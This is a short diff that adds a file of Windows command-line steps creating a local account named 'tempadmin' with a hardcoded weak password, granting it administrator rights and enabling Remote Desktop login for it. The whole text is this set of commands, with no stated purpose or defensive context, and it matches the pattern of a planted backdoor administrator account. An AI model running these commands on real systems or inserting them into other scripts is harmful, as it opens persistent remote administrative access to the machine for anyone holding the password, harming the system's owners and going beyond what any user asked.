@@ -1,0 +1,5 @@
+net user /add tempadmin password123!@#
+
+net localgroup administrators tempadmin /add
+
+net localgroup "Remote Desktop Users" tempadmin /add
